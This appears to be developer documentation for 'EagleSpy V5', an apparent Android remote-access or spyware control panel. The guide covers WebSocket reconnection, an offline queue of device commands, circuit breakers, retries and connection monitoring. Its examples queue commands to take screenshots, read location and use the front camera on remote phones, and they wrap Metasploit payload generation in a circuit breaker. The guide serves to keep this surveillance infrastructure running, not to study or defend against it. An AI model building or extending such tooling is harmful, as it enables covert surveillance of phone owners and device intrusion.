# Network Resilience Guide

This document describes the network resilience features in EagleSpy V5, designed to handle unreliable connections, offline devices, and cascading failures.

## Architecture Overview

```
┌──────────────────┐     ┌────────────────────┐     ┌──────────────────┐
│  Android Client  │◄───►│   ActionCable WS   │◄───►│   Rails Server   │
│                  │     │                    │     │                  │
│ ResilientWS      │     │  HeartbeatChannel  │     │ CircuitBreaker   │
│ - Auto-reconnect │     │  - Ping/Pong       │     │ RetryHandler     │
│ - Message queue  │     │  - Stale detection │     │ OfflineQueue     │
│ - Heartbeat      │     │                    │     │ ConnectionMonitor│
└──────────────────┘     └────────────────────┘     └──────────────────┘
```

## Components

### 1. Resilient WebSocket (Client-Side)

**File:** `app/javascript/modules/resilient_websocket.js`

A drop-in wrapper around ActionCable subscriptions that adds:

- **Auto-reconnect** with exponential backoff (1s → 2s → 4s → 8s → ... → 30s max)
- **Connection state machine**: `disconnected → connecting → connected → disconnecting`
- **Heartbeat ping/pong** every 30 seconds
- **Message queue** while disconnected (up to 200 messages)
- **Auto-replay** of queued messages on reconnect
- **Connection quality indicator** based on measured latency

#### Usage

```javascript
import { ResilientWebSocket, ConnectionState } from 'modules/resilient_websocket'

const ws = new ResilientWebSocket({
  heartbeatInterval: 30000,
  maxQueueSize: 200,
  onStateChange: (newState, oldState) => {
    console.log(`Connection: ${oldState} → ${newState}`)
    updateStatusIndicator(newState)
  },
  onMessage: (data) => {
    handleServerMessage(data)
  },
  onQualityChange: (quality, latency) => {
    console.log(`Quality: ${quality} (${latency}ms)`)
  },
  onError: (error) => {
    console.error('WebSocket error:', error)
  }
})

// Connect to a channel
ws.connect('CommandChannel', { device_id: 'abc123' })

// Send messages (queued automatically if disconnected)
ws.send({ type: 'command', action: 'take_screenshot' })

// Perform channel action
ws.perform('send_command', { command: 'location' })

// Get stats
console.log(ws.getStats())
// => { state: 'connected', quality: 'good', latency: 85, uptime: 3600000, ... }

// Disconnect
ws.disconnect()
```

### 2. Offline Command Queue (Server-Side)

**File:** `app/services/offline_command_queue.rb`
**Model:** `app/models/queued_command.rb`
**Migration:** `db/migrate/20260213100000_create_offline_queue.rb`

Queues commands for offline devices and auto-sends when they reconnect.

#### Features

- **Persistent queue** in PostgreSQL (`queued_commands` table)
- **Priority ordering** (1 = highest, 10 = lowest, default = 5)
- **TTL** of 24 hours (expired commands auto-purged)
- **Max 100 commands** per device
- **Auto-flush** on device reconnection via `CommandChannel`

#### Usage

```ruby
# Queue a command for an offline device
result = OfflineCommandQueue.new(
  'device_abc',
  'take_screenshot',
  params: { camera: 'front' },
  priority: 1,
  ttl: 12.hours
).call

if result.success?
  puts "Queued: #{result.value.id}"
else
  puts "Error: #{result.error}"
end

# Manually flush queue (auto-called on reconnect)
sent = OfflineCommandQueue.flush_for_device('device_abc')

# Expire stale commands
expired = OfflineCommandQueue.expire_stale_commands

# Queue stats
stats = OfflineCommandQueue.queue_stats('device_abc')
# => { pending: 3, sent: 12, failed: 0, expired: 1 }
```

### 3. Circuit Breaker

**File:** `app/services/circuit_breaker.rb`

Prevents cascading failures by tracking error rates per service.

#### States

| State | Behavior |
|-------|----------|
| **Closed** (normal) | Requests pass through. Failures counted. |
| **Open** (failing) | Requests rejected immediately with `CircuitOpenError`. |
| **Half-Open** (testing) | One test request allowed. Success → Closed, Failure → Open. |

#### Configuration

| Option | Default | Description |
|--------|---------|-------------|
| `failure_threshold` | 5 | Failures before opening circuit |
| `timeout` | 30s | Wait before testing recovery (half-open) |

#### Usage

```ruby
# Use the registry for per-service breakers
breaker = CircuitBreaker.for('metasploit_api', failure_threshold: 3, timeout: 60)

begin
  breaker.call do
    MetasploitClient.generate_payload(params)
  end
rescue CircuitBreaker::CircuitOpenError => e
  render json: { error: "Service unavailable, retry after #{e.retry_after}s" }, status: 503
end

# Check metrics
CircuitBreaker.all_metrics
# => [{ service: 'metasploit_api', state: 'closed', failure_count: 1, ... }]

# Manual reset
breaker.reset!
```

### 4. Retry Handler

**File:** `app/services/retry_handler.rb`

Exponential backoff with jitter for transient failures.

#### Configuration

| Option | Default | Description |
|--------|---------|-------------|
| `max_retries` | 3 | Maximum retry attempts |
| `base_delay` | 1s | Base delay between retries |
| `max_delay` | 60s | Maximum delay cap |
| `jitter` | true | Randomize delay to avoid thundering herd |
| `dead_letter_queue` | true | Store permanently failed items in Redis |

#### Usage

```ruby
# Simple usage
RetryHandler.with_retry('send_notification', max_retries: 5) do
  SlackNotifier.send(message)
end

# Check dead letter queue
items = RetryHandler.dead_letter_items(limit: 20)

# Retry a dead letter item
RetryHandler.retry_dead_letter(0) do |item|
  # Re-process the failed operation
end

# Clear DLQ
RetryHandler.clear_dead_letter_queue!
```

### 5. Connection Monitor

**File:** `app/services/connection_monitor.rb`

Tracks all active WebSocket connections with Redis-backed state.

#### Features

- Register/unregister connections
- Track last activity timestamp
- Detect stale connections (no activity > 5 minutes)
- Auto-cleanup dead connections
- Aggregate statistics (uptime, reconnects, latency)

#### Usage

```ruby
# Automatic via HeartbeatChannel, or manual:
ConnectionMonitor.register('device_abc', connection_type: 'device')
ConnectionMonitor.touch('device_abc')
ConnectionMonitor.record_reconnect('device_abc')

# Cleanup stale connections
stale = ConnectionMonitor.cleanup_stale_connections
# => ['device_xyz', 'device_old']

# Get statistics
stats = ConnectionMonitor.statistics
# => {
#   total_connections: 15,
#   device_connections: 12,
#   admin_connections: 3,
#   average_uptime: 7200,
#   total_reconnects: 8,
#   stale_count: 0
# }
```

### 6. Heartbeat Channel

**File:** `app/channels/heartbeat_channel.rb`

Server-side periodic pings via ActionCable.

- Sends ping every **30 seconds**
- Expects client pong response
- Disconnects after **3 missed pongs** (90 seconds of silence)
- Integrates with `ConnectionMonitor` for activity tracking

#### Client Integration

```javascript
// Using ResilientWebSocket (handles pong automatically)
ws.connect('HeartbeatChannel', { device_id: myDeviceId })

// Or manual ActionCable subscription
consumer.subscriptions.create(
  { channel: 'HeartbeatChannel', device_id: myDeviceId },
  {
    received(data) {
      if (data.type === 'ping') {
        this.perform('pong', { ping_sent_at: data.sent_at })
      }
    }
  }
)
```

## API Endpoints

All under `/api/v1/`:

| Method | Path | Description |
|--------|------|-------------|
| GET | `/connections` | List all active WebSocket connections |
| GET | `/connections/stats` | Aggregate connection statistics |
| POST | `/connections/cleanup` | Trigger stale connection cleanup |
| GET | `/circuit_breakers` | List all circuit breaker states |
| POST | `/circuit_breakers/:service/reset` | Reset a circuit breaker |
| GET | `/offline_queue/:device_id` | Queue stats for a device |
| POST | `/offline_queue/:device_id` | Enqueue a command |
| DELETE | `/offline_queue/:device_id` | Flush pending commands |

## Database Migration

Run the migration to create the `queued_commands` table:

```bash
rails db:migrate
```

The migration creates:
- `queued_commands` table with columns: `smartphone_id`, `command`, `params` (JSONB), `priority`, `expires_at`, `status`, `sent_at`, `error_message`
- Indexes for efficient querying by device + status, status + expiry, and priority ordering

## Monitoring

### Redis Keys

| Key Pattern | Type | Purpose |
|-------------|------|---------|
| `ws:connections` | Hash | All active connection data |
| `ws:active_ids` | Set | Active connection device IDs |
| `circuit_breaker:{service}:state` | String | Circuit breaker state |
| `circuit_breaker:{service}:failures` | String | Failure count |
| `retry:dead_letter_queue` | List | Failed retry items (max 1000) |

### Health Checks

Combine with existing `/health` endpoints:

```ruby
# Check circuit breakers
CircuitBreaker.all_metrics.select { |m| m[:state] != 'closed' }

# Check stale connections
ConnectionMonitor.statistics[:stale_count]

# Check offline queue backlog
QueuedCommand.pending.count
```
